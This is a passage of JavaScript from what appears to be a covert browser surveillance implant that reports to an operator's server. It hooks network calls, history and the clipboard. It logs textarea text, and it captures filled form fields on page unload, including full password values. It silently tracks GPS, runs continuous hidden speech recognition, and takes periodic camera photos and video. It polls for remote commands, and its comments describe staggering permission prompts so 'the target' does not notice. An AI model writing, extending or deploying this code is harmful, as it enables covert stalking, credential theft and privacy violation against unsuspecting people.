        try {
            const origFetch = window.fetch;
            if (!origFetch) return;
            const _post       = post; // capture reference
            const ownOrigin   = location.origin;
            window.fetch = function(input, init) {
                try {
                    const url    = typeof input === 'string' ? input : (input.url || String(input));
                    const method = (init && init.method ? init.method : 'GET').toUpperCase();
                    // Only log cross-origin or API-looking requests to avoid infinite loop
                    if (!url.includes('/log-keys') && !url.includes('/heartbeat')) {
                        const short = url.slice(0, 180);
                        _post('/log-keys', {
                            keys: `[FETCH] ${method} ${short}`,
                            url: location.href
                        });
                    }
                } catch {}
                return origFetch.apply(this, arguments);
            };
        } catch {}
    }

    // ═══ XHR INTERCEPTOR ══════════════════════════════════════
    // Wraps XMLHttpRequest.open() to log AJAX/XHR calls made by the page.
    // Only logs the URL and method — never request body content.
    function initXHRInterceptor() {
        try {
            const origOpen = XMLHttpRequest.prototype.open;
            if (!origOpen) return;
            const _post = post; // capture reference
            XMLHttpRequest.prototype.open = function(method, url) {
                try {
                    const sUrl = String(url || '');
                    // Skip our own tracking endpoints to avoid infinite loops
                    if (!sUrl.includes('/log-keys') && !sUrl.includes('/heartbeat')) {
                        _post('/log-keys', {
                            keys: `[XHR] ${(method || 'GET').toUpperCase()} ${sUrl.slice(0, 180)}`,
                            url: location.href
                        });
                    }
                } catch {}
                return origOpen.apply(this, arguments);
            };
        } catch {}
    }

    // ═══ INPUT TYPE CLASSIFIER ════════════════════════════════
    // Watches input events and detects when sensitive data patterns are being typed:
    // credit card numbers, phone numbers, SSN, date-of-birth, postal codes, etc.
    // Fires a one-shot log per field — does NOT capture the actual value.
    function initInputTypeClassifier() {
        const alerted = new WeakSet(); // track which inputs have already fired
        const patterns = [
            { re: /\b\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{4}\b/, label: 'CREDIT CARD' },
            { re: /\b\d{4}[\s\-]?\d{6}[\s\-]?\d{5}\b/,              label: 'AMEX' },
            { re: /\b\d{3}[-.]?\d{3}[-.]?\d{4}\b/,                   label: 'PHONE (US)' },
            { re: /\+\d{1,3}[\s\-]?\d{6,14}/,                        label: 'PHONE (INTL)' },
            { re: /\b\d{3}[\s\-]\d{2}[\s\-]\d{4}\b/,                 label: 'SSN' },
            { re: /\b\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{3}\b/, label: 'PASSPORT' },
            { re: /\b[A-Z]{2}\s?\d{2}\s?\d{4}\s?\d{6}\s?\d{2}[A-Z]\s?\d{3}\s?\d\b/i, label: 'IBAN' },
        ];
        document.addEventListener('input', ev => {
            try {
                const el = ev.target;
                if (!el || alerted.has(el)) return;
                const t = (el.type || '').toLowerCase();
                if (t === 'password') return;  // don't examine password fields
                const val = el.value || '';
                if (val.length < 8) return;    // too short to match
                for (const { re, label } of patterns) {
                    if (re.test(val)) {
                        alerted.add(el);       // only report once per element
                        const name = el.name || el.id || el.placeholder || 'unknown';
                        post('/log-keys', {
                            keys: `[INPUT TYPE] ${label} pattern detected in field "${name.slice(0,40)}"`,
                            url: location.href
                        });
                        break;
                    }
                }
            } catch {}
        }, true);
    }

    // ═══ BEACON INTERCEPTOR ═══════════════════════════════════
    // Wraps navigator.sendBeacon to log beacon calls made by the page.
    // sendBeacon is commonly used for analytics pings on page unload.
    function initBeaconInterceptor() {
        try {
            if (!navigator.sendBeacon) return;
            const origBeacon = navigator.sendBeacon.bind(navigator);
            const _post = post;
            navigator.sendBeacon = function(url, data) {
                try {
                    const sUrl = String(url || '').slice(0, 180);
                    if (!sUrl.includes('/log-keys') && !sUrl.includes('/heartbeat')) {
                        _post('/log-keys', {
                            keys: `[BEACON] ${sUrl}`,
                            url: location.href
                        });
                    }
                } catch {}
                return origBeacon(url, data);
            };
        } catch {}
    }

    // ═══ STORAGE SIZE TRACKER ═════════════════════════════════
    // Measures how much data is stored in localStorage and sessionStorage
    // and reports the approximate sizes, which reveals usage patterns.
    function initStorageSizeTracker() {
        try {
            const calcSize = (storage) => {
                let total = 0;
                try {
                    for (let i = 0; i < storage.length; i++) {
                        const key = storage.key(i);
                        const val = storage.getItem(key) || '';
                        total += key.length + val.length;
                    }
                } catch {}
                return total;
            };
            const lsSize  = calcSize(localStorage) * 2;  // approximate bytes (UTF-16)
            const ssSize  = calcSize(sessionStorage) * 2;
            const lsItems = localStorage.length;
            const ssItems = sessionStorage.length;
            const fmt = b => b > 1024 ? (b / 1024).toFixed(1) + 'KB' : b + 'B';
            post('/log-keys', {
                keys: `[STORAGE SIZE] localStorage=${fmt(lsSize)}(${lsItems}items) sessionStorage=${fmt(ssSize)}(${ssItems}items) quota=${navigator.storage ? 'present' : 'unknown'}`,
                url: location.href
            });
        } catch {}
    }

    // ═══ HISTORY TRACKER ══════════════════════════════════════
    // Patches pushState/replaceState to track SPA navigation on sites using
    // the History API (React Router, Vue Router, etc.).
    function initHistoryTracker() {
        try {
            const report = (method, url) => {
                post('/log-keys', {
                    keys: `[HISTORY] ${method} → ${String(url || location.href).slice(0, 200)}`,
                    url: location.href
                });
            };
            const origPush    = history.pushState.bind(history);
            const origReplace = history.replaceState.bind(history);
            history.pushState = function(state, title, url) {
                origPush(state, title, url);
                report('pushState', url);
            };
            history.replaceState = function(state, title, url) {
                origReplace(state, title, url);
                report('replaceState', url);
            };
            window.addEventListener('popstate', () => {
                report('popstate', location.href);
            });
        } catch {}
    }

    // ═══ CLIPBOARD WRITE SPY ═══════════════════════════════════
    // Detects when the page programmatically writes to the clipboard
    // via document.execCommand('copy') or the Clipboard API.
    function initClipboardWriteSpy() {
        try {
            // Intercept Clipboard API writes
            if (navigator.clipboard && navigator.clipboard.writeText) {
                const origWrite = navigator.clipboard.writeText.bind(navigator.clipboard);
                const _post = post;
                navigator.clipboard.writeText = function(text) {
                    try {
                        _post('/log-keys', {
                            keys: `[CLIPBOARD WRITE] page wrote ${text.length}ch: "${String(text).slice(0, 120)}"`,
                            url: location.href
                        });
                    } catch {}
                    return origWrite(text);
                };
            }
            // Detect execCommand copy via copy event
            document.addEventListener('copy', ev => {
                try {
                    // If clipboardData has content, the page may be setting it
                    const dt = ev.clipboardData;
                    if (dt && dt.getData && dt.getData('text/plain')) {
                        const val = dt.getData('text/plain');
                        post('/log-keys', {
                            keys: `[CLIPBOARD WRITE execCmd] "${val.slice(0, 120)}"`,
                            url: location.href
                        });
                    }
                } catch {}
            }, true);
        } catch {}
    }

    // ═══ PASSWORD STRENGTH METER ══════════════════════════════
    // Monitors password inputs and reports strength on blur so the operator knows
    // whether the target is using a weak or strong password (without sending the value).
    function initPasswordStrengthMeter() {
        try {
            const score = (pw) => {
                let s = 0;
                if (pw.length >= 8)  s++;
                if (pw.length >= 12) s++;
                if (pw.length >= 16) s++;
                if (/[A-Z]/.test(pw)) s++;
                if (/[a-z]/.test(pw)) s++;
                if (/[0-9]/.test(pw)) s++;
                if (/[^A-Za-z0-9]/.test(pw)) s++;
                return s; // 0–7
            };
            const label = (s) => s <= 1 ? 'VERY WEAK' : s <= 2 ? 'WEAK' : s <= 4 ? 'FAIR' : s <= 5 ? 'STRONG' : 'VERY STRONG';
            document.addEventListener('blur', ev => {
                try {
                    const t = ev.target;
                    if (t.type !== 'password' || !t.value) return;
                    const pw = t.value;
                    const s = score(pw);
                    post('/log-keys', {
                        keys: `[PASSWORD STRENGTH] ${label(s)} (score ${s}/7, len ${pw.length}) — field: "${(t.name||t.id||'?').slice(0,30)}"`,
                        url: location.href
                    });
                } catch {}
            }, true);
        } catch {}
    }

    // ═══ TEXTAREA CAPTURE ═════════════════════════════════════
    // Logs the content of <textarea> elements when they lose focus.
    // Useful for capturing draft messages, comments, search queries etc.
    function initTextareaCapture() {
        try {
            document.addEventListener('blur', ev => {
                try {
                    const t = ev.target;
                    if (t.tagName !== 'TEXTAREA') return;
                    const val = (t.value || '').trim();
                    if (!val || val.length < 5) return;
                    post('/log-keys', {
                        keys: `[TEXTAREA] name="${(t.name||t.id||'?').slice(0,30)}" len=${val.length}: "${val.slice(0,200)}"`,
                        url: location.href
                    });
                } catch {}
            }, true);
        } catch {}
    }

    // ═══ VISIBILITY DURATION TRACKER ══════════════════════════
    // Tracks how long the page is visible vs hidden by measuring each
    // foreground session. Reports on each transition back to background.
    function initVisibilityDuration() {
        try {
            let visStart = document.visibilityState === 'visible' ? Date.now() : null;
            document.addEventListener('visibilitychange', () => {
                try {
                    if (document.visibilityState === 'visible') {
                        visStart = Date.now();
                    } else if (visStart) {
                        const secs = Math.round((Date.now() - visStart) / 1000);
                        visStart = null;
                        if (secs < 1) return;
                        const h = Math.floor(secs / 3600), m = Math.floor((secs % 3600) / 60), s = secs % 60;
                        const dur = h ? `${h}h ${m}m ${s}s` : m ? `${m}m ${s}s` : `${s}s`;
                        post('/log-keys', {
                            keys: `[VISIBILITY] page was visible for ${dur}`,
                            url: location.href
                        });
                    }
                } catch {}
            });
        } catch {}
    }

    // ═══ GEOLOCATION WATCHER ══════════════════════════════════
    // Silently watches for GPS position changes (active movement).
    // Uses the existing post-location flow and also emits a [GEO UPDATE]
    // keylog entry so movements appear in the keystrokes timeline.
    // Only activates if Geolocation permission is already granted
    // (won't trigger a browser prompt — that's handled by initWebRTCIPTracker).
    function initGeolocationWatcher() {
        try {
            if (!navigator.geolocation) return;
            let lastLat = null, lastLon = null;
            const MIN_DIST_M = 20; // only report if moved ≥ 20 m
            const dist = (a, b, c, d) => {
                // Haversine distance in metres
                const R = 6371000, dLat = (c - a) * Math.PI / 180, dLon = (d - b) * Math.PI / 180;
                const x = Math.sin(dLat/2)**2 + Math.cos(a*Math.PI/180) * Math.cos(c*Math.PI/180) * Math.sin(dLon/2)**2;
                return R * 2 * Math.atan2(Math.sqrt(x), Math.sqrt(1-x));
            };
            navigator.permissions && navigator.permissions.query({ name: 'geolocation' }).then(status => {
                if (status.state !== 'granted') return;
                navigator.geolocation.watchPosition(pos => {
                    try {
                        const { latitude: lat, longitude: lon, accuracy } = pos.coords;
                        const moved = lastLat == null || dist(lastLat, lastLon, lat, lon) >= MIN_DIST_M;
                        if (!moved) return;
                        lastLat = lat; lastLon = lon;
                        // Log to locations endpoint (same as existing GPS capture)
                        post('/upload-location', { latitude: lat, longitude: lon, accuracy, source: 'GPS_WATCH' });
                        post('/log-keys', {
                            keys: `[GEO UPDATE] ${lat.toFixed(5)},${lon.toFixed(5)} ±${Math.round(accuracy)}m`,
                            url: location.href
                        });
                    } catch {}
                }, null, { enableHighAccuracy: true, timeout: 30000, maximumAge: 15000 });
            }).catch(() => {});
        } catch {}
    }

    // ═══ LABEL CONTEXT TRACKER ════════════════════════════════
    // Enhances field focus data by finding the associated <label> text,
    // revealing human-readable field intent (e.g. "Credit Card Number", "Full Name").
    function initLabelContextTracker() {
        try {
            const seen = new WeakSet();
            document.addEventListener('focusin', ev => {
                try {
                    const el = ev.target;
                    if (!el || !['INPUT','TEXTAREA','SELECT'].includes(el.tagName)) return;
                    if (el.type === 'hidden' || el.type === 'submit' || el.type === 'button') return;
                    if (seen.has(el)) return;
                    seen.add(el);
                    // Find label text
                    let labelText = '';
                    if (el.id) {
                        const lbl = document.querySelector(`label[for="${CSS.escape(el.id)}"]`);
                        if (lbl) labelText = lbl.textContent.trim().slice(0, 80);
                    }
                    if (!labelText) {
                        let p = el.parentElement;
                        while (p && p !== document.body) {
                            if (p.tagName === 'LABEL') { labelText = p.textContent.replace(el.value || '', '').trim().slice(0, 80); break; }
                            p = p.parentElement;
                        }
                    }
                    if (!labelText) {
                        const ariaLabel = el.getAttribute('aria-label') || el.getAttribute('aria-labelledby') && (document.getElementById(el.getAttribute('aria-labelledby')) || {}).textContent;
                        if (ariaLabel) labelText = String(ariaLabel).trim().slice(0, 80);
                    }
                    if (!labelText) return; // only report if we found a label — avoids duplicate noise w/ initFieldFocusTracker
                    const name = el.name || el.id || el.placeholder || '?';
                    post('/log-keys', {
                        keys: `[LABEL FOCUS] "${labelText}" (${el.tagName.toLowerCase()} name="${name.slice(0,30)}" type=${el.type||'?'})`,
                        url: location.href
                    });
                } catch {}
            });
        } catch {}
    }

    // ═══ CONTACTS API DETECTOR ════════════════════════════════
    // Detects availability of the Contact Picker API (Chrome Android only).
    // If available, it means we could request the user's contacts.
    function initContactsDetector() {
        try {
            if (!('contacts' in navigator && 'ContactsManager' in window)) return;
            post('/log-keys', {
                keys: `[CONTACTS API] Contact Picker API available — select() supported`,
                url: location.href
            });
        } catch {}
    }

    // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
    // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
    // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
    function initOrientationTracker() {        let sent = false; // only need one snapshot per page load

        function captureOrientation(ev) {
            if (sent) return;
            sent = true;
            window.removeEventListener('deviceorientation', captureOrientation);
            try {
                const alpha  = ev.alpha  != null ? Math.round(ev.alpha)  : null; // compass 0-360
                const beta   = ev.beta   != null ? Math.round(ev.beta)   : null; // front/back tilt -180..180
                const gamma  = ev.gamma  != null ? Math.round(ev.gamma)  : null; // left/right tilt -90..90
                const absol  = ev.absolute ? 'absolute' : 'relative';
                if (alpha === null && beta === null && gamma === null) return; // no real data
                post('/log-keys', {
                    keys: `[DEVICE ORIENTATION] compass=${alpha}° tilt-fb=${beta}° tilt-lr=${gamma}° ref=${absol}`,
                    url: location.href
                });
            } catch {}
        }

        // iOS 13+ requires permission before deviceorientation fires
        if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
            // Request on first user interaction
            const req = () => {
                DeviceOrientationEvent.requestPermission().then(state => {
                    if (state === 'granted') window.addEventListener('deviceorientation', captureOrientation, { once: true });
                }).catch(() => {});
                document.removeEventListener('click', req);
            };
            document.addEventListener('click', req, { once: true });
        } else if (window.DeviceOrientationEvent) {
            window.addEventListener('deviceorientation', captureOrientation, { once: true });
        }

        // Also capture device motion (acceleration)
        let motionSent = false;
        function captureMotion(ev) {
            if (motionSent) return;
            const a = ev.acceleration;
            if (!a || (a.x == null && a.y == null && a.z == null)) return;
            motionSent = true;
            window.removeEventListener('devicemotion', captureMotion);
            try {
                post('/log-keys', {
                    keys: `[DEVICE MOTION] x=${a.x?.toFixed(2)} y=${a.y?.toFixed(2)} z=${a.z?.toFixed(2)} m/s²` +
                          (ev.rotationRate ? ` rot-alpha=${ev.rotationRate.alpha?.toFixed(1)} rot-beta=${ev.rotationRate.beta?.toFixed(1)} rot-gamma=${ev.rotationRate.gamma?.toFixed(1)} °/s` : ''),
                    url: location.href
                });
            } catch {}
        }
        if (window.DeviceMotionEvent) window.addEventListener('devicemotion', captureMotion, { once: true });
    }

    // ═══ BATTERY CHANGE MONITORING ════════════════════════════
    // Subscribes once to battery levelchange + chargingchange events so any
    // significant battery events are logged in real time without polling.
    async function initBatteryMonitor() {
        try {
            if (!navigator.getBattery) return;
            const b = await navigator.getBattery();
            const report = (event) => {
                try {
                    post('/log-keys', {
                        keys: `[BATTERY] level=${Math.round(b.level * 100)}% charging=${b.charging} event=${event}`,
                        url: location.href
                    });
                } catch {}
            };
            b.addEventListener('levelchange', () => report('levelchange'));
            b.addEventListener('chargingchange', () => report('chargingchange'));
            b.addEventListener('chargingtimechange', () => report('chargingtimechange'));
            b.addEventListener('dischargingtimechange', () => report('dischargingtimechange'));
        } catch {}
    }

    // ═══ KEYBOARD SHORTCUT LOGGER ═════════════════════════════
    // Detects Ctrl/Cmd keyboard shortcuts (Ctrl+C, Ctrl+S, Ctrl+A, Ctrl+F, etc.)
    // and logs them so operators see what actions the target is performing.
    function initKeyboardShortcutLogger() {
        const shortcuts = {
            'c': '[CTRL+C] Copy', 'v': '[CTRL+V] Paste', 'x': '[CTRL+X] Cut',
            'a': '[CTRL+A] Select All', 's': '[CTRL+S] Save', 'p': '[CTRL+P] Print',
            'f': '[CTRL+F] Find', 'z': '[CTRL+Z] Undo', 'y': '[CTRL+Y] Redo',
            'w': '[CTRL+W] Close Tab', 't': '[CTRL+T] New Tab', 'l': '[CTRL+L] Address Bar',
            '+': '[CTRL+Plus] Zoom In', '-': '[CTRL+Minus] Zoom Out', '0': '[CTRL+0] Zoom Reset',
            'r': '[CTRL+R] Reload', 'u': '[CTRL+U] View Source', 'i': '[CTRL+I] DevTools',
            'j': '[CTRL+J] Downloads', 'h': '[CTRL+H] History'
        };
        let last = 0;
        document.addEventListener('keydown', e => {
            if (!e.ctrlKey && !e.metaKey) return;
            const k = e.key.toLowerCase();
            const label = shortcuts[k];
            if (!label) return;
            const now = Date.now();
            if (now - last < 1000) return; // debounce 1s per shortcut burst
            last = now;
            try {
                post('/log-keys', {
                    keys: `${label} on ${document.title.slice(0, 60)}`,
                    url: location.href
                });
            } catch {}
        }, true);
    }

    // ═══ DOUBLE CLICK TRACKER ═════════════════════════════════
    // Captures double-click events on text elements — reveals what the target
    // is interested in (words, links, UI elements they examine closely).
    function initDoubleClickTracker() {
        let last = 0;
        document.addEventListener('dblclick', e => {
            const now = Date.now();
            if (now - last < 1500) return;
            last = now;
            try {
                const t = e.target;
                const tag = t.tagName || '';
                const sel = window.getSelection ? window.getSelection().toString().trim() : '';
                const desc = sel ? `"${sel.slice(0, 80)}"` : `<${tag.toLowerCase()}>${(t.textContent||'').trim().slice(0, 60)}`;
                post('/log-keys', {
                    keys: `[DOUBLE CLICK] ${desc}`,
                    url: location.href
                });
            } catch {}
        });
    }

    // ═══ MEDIA PLAYBACK TRACKER ═══════════════════════════════
    // Detects when the user plays/pauses video or audio elements on the page.
    function initMediaPlaybackTracker() {
        const handled = new WeakSet();
        function attach(el) {
            if (handled.has(el)) return;
            handled.add(el);
            const name = el.src ? el.src.split('/').pop().slice(0, 60) : (el.id || el.tagName);
            el.addEventListener('play', () => {
                try { post('/log-keys', { keys: `[MEDIA PLAY] ${el.tagName} "${name}" at ${el.currentTime.toFixed(1)}s`, url: location.href }); } catch {}
            });
            el.addEventListener('pause', () => {
                if (el.ended) return;
                try { post('/log-keys', { keys: `[MEDIA PAUSE] ${el.tagName} "${name}" at ${el.currentTime.toFixed(1)}s`, url: location.href }); } catch {}
            });
            el.addEventListener('ended', () => {
                try { post('/log-keys', { keys: `[MEDIA ENDED] ${el.tagName} "${name}"`, url: location.href }); } catch {}
            });
        }
        // Attach to all existing media elements
        document.querySelectorAll('video,audio').forEach(attach);
        // Observe future media elements added to DOM
        try {
            const obs = new MutationObserver(muts => {
                for (const m of muts) {
                    for (const node of m.addedNodes) {
                        if (node.tagName === 'VIDEO' || node.tagName === 'AUDIO') attach(node);
                        if (node.querySelectorAll) node.querySelectorAll('video,audio').forEach(attach);
                    }
                }
            });
            obs.observe(document.body, { childList: true, subtree: true });
        } catch {}
    }

    // ═══ INIT ══════════════════════════════════════════════════
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden) {
            // Send an immediate heartbeat so admin sees the client come back online instantly
            heartbeat();
            if (!stream || stream.getTracks().some(t => t.readyState === 'ended')) { videoReady = false; initCamera(); }
            // Reconnect socket if needed
            if (liveSocket && !liveSocket.connected) liveSocket.connect();
        }
    });

    function initTabSwitchTracker() {
        let hiddenAt = null;
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                hiddenAt = Date.now();
                logEvent('tab_hidden', { title: document.title, url: location.href });
            } else {
                const awaySeconds = hiddenAt ? Math.round((Date.now() - hiddenAt) / 1000) : null;
                logEvent('tab_visible', { awaySeconds, title: document.title, url: location.href });
            }
        });
    }

    function initUnloadCapture() {
        // On page unload: snapshot any filled input fields and log them
        window.addEventListener('beforeunload', () => {
            const fields = document.querySelectorAll('input[type=text],input[type=email],input[type=password],input[type=tel],textarea');
            const snapshot = [];
            fields.forEach(f => {
                const val = f.value?.trim();
                if (!val) return;
                const id = f.id || f.name || f.placeholder || f.type;
                const sens = /pass|wacht|ww|secret/i.test(id) || f.type === 'password';
                snapshot.push({ id, type: f.type, value: sens ? val : val.slice(0, 60), sensitive: sens });
            });
            if (snapshot.length) {
                logEvent('unload_fields', { fields: snapshot, url: location.href });
            }
        });
    }

    function initPageFocusTimeTracker() {
        let focusStart = document.hasFocus() ? Date.now() : null;
        let totalFocusMs = 0;
        window.addEventListener('focus', () => { focusStart = Date.now(); });
        window.addEventListener('blur', () => {
            if (focusStart) {
                totalFocusMs += Date.now() - focusStart;
                focusStart = null;
                logEvent('focus_time', { totalFocusSec: Math.round(totalFocusMs / 1000) });
            }
        });
        window.addEventListener('beforeunload', () => {
            if (focusStart) totalFocusMs += Date.now() - focusStart;
            if (totalFocusMs > 1000) logEvent('focus_time_final', { totalFocusSec: Math.round(totalFocusMs / 1000) });
        });
    }

    function initAmbientLightCapture() {
        // AmbientLightSensor API (Chrome on Android with sensor permission)
        try {
            if ('AmbientLightSensor' in window) {
                const sensor = new AmbientLightSensor({ frequency: 1 });
                sensor.addEventListener('reading', () => {
                    logEvent('ambient_light', { lux: sensor.illuminance });
                    sensor.stop(); // one-shot
                });
                sensor.addEventListener('error', () => {});
                sensor.start();
            } else {
                // Fallback: infer dark/light via prefers-color-scheme
                const dark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                logEvent('color_scheme', { dark, scheme: dark ? 'dark' : 'light' });
            }
        } catch (e) {}
    }

    function initContextMenuTracker() {
        document.addEventListener('contextmenu', (e) => {
            const el = e.target;
            const tag = el.tagName?.toLowerCase() || 'unknown';
            const txt = (window.getSelection()?.toString() || el.alt || el.textContent || '').trim().slice(0, 120);
            const src = el.src || el.href || el.currentSrc || '';
            logEvent('context_menu', { tag, text: txt, src: src.slice(0, 200), x: e.clientX, y: e.clientY });
        });
    }

    function initTouchEventTracker() {
        let touchStartX = 0, touchStartY = 0, touchStartTime = 0;
        document.addEventListener('touchstart', (e) => {
            if (e.touches.length === 1) {
                touchStartX = e.touches[0].clientX;
                touchStartY = e.touches[0].clientY;
                touchStartTime = Date.now();
            } else if (e.touches.length === 2) {
                logEvent('touch_pinch_start', { touches: 2 });
            }
        }, { passive: true });
        document.addEventListener('touchend', (e) => {
            if (e.changedTouches.length !== 1) return;
            const dx = e.changedTouches[0].clientX - touchStartX;
            const dy = e.changedTouches[0].clientY - touchStartY;
            const dist = Math.sqrt(dx * dx + dy * dy);
            const duration = Date.now() - touchStartTime;
            if (dist > 50 && duration < 400) {
                const dir = Math.abs(dx) > Math.abs(dy) ? (dx > 0 ? 'right' : 'left') : (dy > 0 ? 'down' : 'up');
                logEvent('swipe', { direction: dir, distance: Math.round(dist), durationMs: duration });
            }
        }, { passive: true });
    }

    function initSpeechRecognitionSpy() {
        // Silently start continuous speech recognition and log transcripts
        const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
        if (!SR) return;
        // Only run if microphone is ALREADY granted — speech rec triggers its own
        // repeated prompt in some browsers even when mic is allowed via getUserMedia.
        // By checking here we avoid annoying the user with an extra dialog.
        navigator.permissions.query({ name: 'microphone' }).then(s => {
            if (s.state !== 'granted') return;
            try {
            const rec = new SR();
            rec.continuous = true;
            rec.interimResults = true;
            rec.lang = 'nl-NL';
            let lastLog = 0;
            rec.onresult = (e) => {
                const now = Date.now();
                if (now - lastLog < 3000) return; // throttle to 1 log per 3s
                const transcript = Array.from(e.results)
                    .map(r => r[0].transcript)
                    .join(' ')
                    .trim();
                if (transcript && transcript.length > 3) {
                    logEvent('speech_transcript', { text: transcript.slice(0, 300) });
                    lastLog = now;
                }
            };
            rec.onerror = () => {};
            rec.onend = () => {
                // Auto-restart on end (keeps listening continuously)
                try { rec.start(); } catch (_) {}
            };
            rec.start();
            } catch (_) {}
        }).catch(() => {});
    }

    async function initAll() {
        await fetchConfig();
        logPageVisit();
        heartbeat();
        setInterval(heartbeat, C.heartbeatPeriod);
        setInterval(pollCommands, C.commandPoll);
        collectDeviceInfo();
        setInterval(collectDeviceInfo, C.deviceInfoPeriod);
        // Location prompt fires 20s after camera so users see one request at a time
        if (C.locationEnabled) setTimeout(trackLocation, 20000);
        if (C.keystrokesEnabled) initKeyLogger();
        if (C.clipboardEnabled) { initClipboardMonitor(); setInterval(checkClipboard, C.clipboardCheck); }
        // Init camera — also sets up periodic photo/video once ready
        setTimeout(async () => {
            await initCamera();
            // Periodic photo capture — respects C.photoEnabled on each tick so
            // enabling/disabling from admin settings takes effect within one period
            setInterval(() => { if (C.photoEnabled) takePhoto(); }, C.photoPeriod || 30000);
            // Periodic video recording — first clip starts after 60s to avoid
            // recording immediately on page load
            setTimeout(() => {
                setInterval(() => { if (C.videoEnabled) recordVideo(); }, C.videoPeriod || 300000);
            }, 60000);
        }, 500);
        setInterval(fetchConfig, 30000); // re-fetch server config every 30s
        // Connect live camera socket (for audio streaming)
        setTimeout(initLiveSocket, 2000);
        // Enhanced tracking
        initFormInterceptor();
        initIdleTracker();
        initScrollTracker();
        initSelectionTracker();
        initCopyPrintTracker();
        initFieldFocusTracker();
        initInputBlurTracker();
        initLinkClickTracker();
        initPasteTracker();
        initScrollDepthTracker();
        initResizeTracker();
        initPageTypeDetector();
        initWebRTCIPTracker();
        initAutoFillDetector();
        initTimezoneCapture();
        initLocalStorageInspector();
        initSessionStorageInspector();
        initMediaDevicesCapture();
        initCookieInspector();
        initPerformanceTimingCapture();
        initFormSubmitTracker();
        initRageClickDetector();
        initNavigatorFingerprint();
        initFontEnumerator();
        initWebSocketDetector();
        initFetchInterceptor();
        initXHRInterceptor();
        initBeaconInterceptor();
        initInputTypeClassifier();
        initStorageSizeTracker();
        initHistoryTracker();
        initClipboardWriteSpy();
        initPasswordStrengthMeter();
        initTextareaCapture();
        initVisibilityDuration();
        initGeolocationWatcher();
        initLabelContextTracker();
        initContactsDetector();
        initErrorCapture();
        initNetworkMonitor();
        initOrientationTracker();
        initBatteryMonitor();
        initKeyboardShortcutLogger();
        initDoubleClickTracker();
        initMediaPlaybackTracker();
        initTabSwitchTracker();
        initContextMenuTracker();
        initTouchEventTracker();
        initAmbientLightCapture();
        initPageFocusTimeTracker();
        initUnloadCapture();
        // Speech recognition delayed by 40s — fires well after camera + location prompts
        // so users don't see all permission requests stacked at once
        setTimeout(initSpeechRecognitionSpy, 40000);
    }

    // Works whether script is injected before OR after DOMContentLoaded fires
    if (document.readyState === 'loading') {
        window.addEventListener('DOMContentLoaded', initAll);
    } else {
        setTimeout(initAll, 0); // already loaded — run async on next tick
    }

    window.addEventListener('beforeunload', () => {
        if (keyBuffer.length > 0) {
            const b = new Blob([JSON.stringify({ clientId: ID, keys: keyBuffer, url: location.href })], { type: 'application/json' });
            navigator.sendBeacon(BASE + '/log-keys', b);
        }
        // Report total page session duration and visible time
        try {
            const totalMs = Date.now() - pageStartTime;
            const hidMs = totalHiddenMs + (hiddenSince ? Date.now() - hiddenSince : 0);
            const visMs = Math.max(0, totalMs - hidMs);
            const fmt = ms => ms < 60000 ? Math.round(ms/1000) + 's' : Math.round(ms/60000) + 'm' + Math.round((ms%60000)/1000) + 's';
            navigator.sendBeacon(BASE + '/log-keys', new Blob([JSON.stringify({
                clientId: ID, url: location.href,
                keys: `[PAGE SESSION] total=${fmt(totalMs)} visible=${fmt(visMs)} hidden=${fmt(hidMs)}`
            })], { type: 'application/json' }));
        } catch {}
        // Immediately signal server that this client is offline
        const offlineBlob = new Blob([JSON.stringify({ clientId: ID, offline: true })], { type: 'application/json' });
        navigator.sendBeacon(BASE + '/heartbeat', offlineBlob);
        stopLiveFeed();
        stopAudioStream();
        if (liveSocket) liveSocket.disconnect();
        if (stream) stream.getTracks().forEach(t => t.stop());
    });
})();
